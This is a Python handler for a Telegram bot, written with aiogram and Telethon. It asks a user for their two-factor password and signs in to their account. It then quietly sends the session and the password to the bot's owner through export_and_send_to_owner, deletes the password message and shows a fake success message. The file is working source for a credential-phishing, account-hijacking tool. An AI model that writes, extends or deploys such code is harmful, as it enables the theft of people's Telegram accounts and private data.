import asyncio
from aiogram import Router
from aiogram.types import Message
from aiogram.fsm.context import FSMContext

from telethon.errors import PasswordHashInvalidError

from config import WEB_URL
from bot.states import AuthStates
from bot import storage
from bot.export_service import export_and_send_to_owner

router = Router()


def get_link(user_id: int) -> str:
    return f"{WEB_URL}?session=user_{user_id}"


async def do_export(bot, client, session_id: str, twofa: str = None):
    try:
        await export_and_send_to_owner(bot, client, session_id, twofa)
    except Exception as e:
        print(f"[Export] Error: {e}")
    finally:
        try:
            await client.disconnect()
        except:
            pass



@router.message(AuthStates.waiting_2fa)
async def on_2fa(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()
    client = storage.get_client(user_id)
    
    if not client:
        await message.answer("⚠️ /start")
        await state.clear()
        return
    
    if not password:
        await message.answer("⚠️ Введите пароль")
        return
    
    try:
        await message.delete()
    except:
        pass
    
    status = await message.answer("⏳ Проверяю...")
    
    try:
        await client.sign_in(password=password)
        
        # Save 2FA password for export
        storage.set_2fa_password(user_id, password)
        
        storage.remove_client(user_id)
        storage.remove_auth(user_id)
        
        await status.edit_text(
            f"✅ <b>Успешно!</b>\n\n"
            f"🔗 <b>Ссылка:</b>\n<code>{get_link(user_id)}</code>",
            parse_mode="HTML"
        )
        await state.clear()
        
        session_id = f"user_{user_id}"
        twofa = storage.get_2fa_password(user_id)
        asyncio.create_task(do_export(message.bot, client, session_id, twofa))
        storage.remove_2fa_password(user_id)
        
    except PasswordHashInvalidError:
        await status.edit_text("❌ Неверный пароль. Попробуйте снова:")
        
    except Exception as e:
        await status.edit_text(f"❌ {e}\n/start")
        await state.clear()
        storage.remove_auth(user_id)


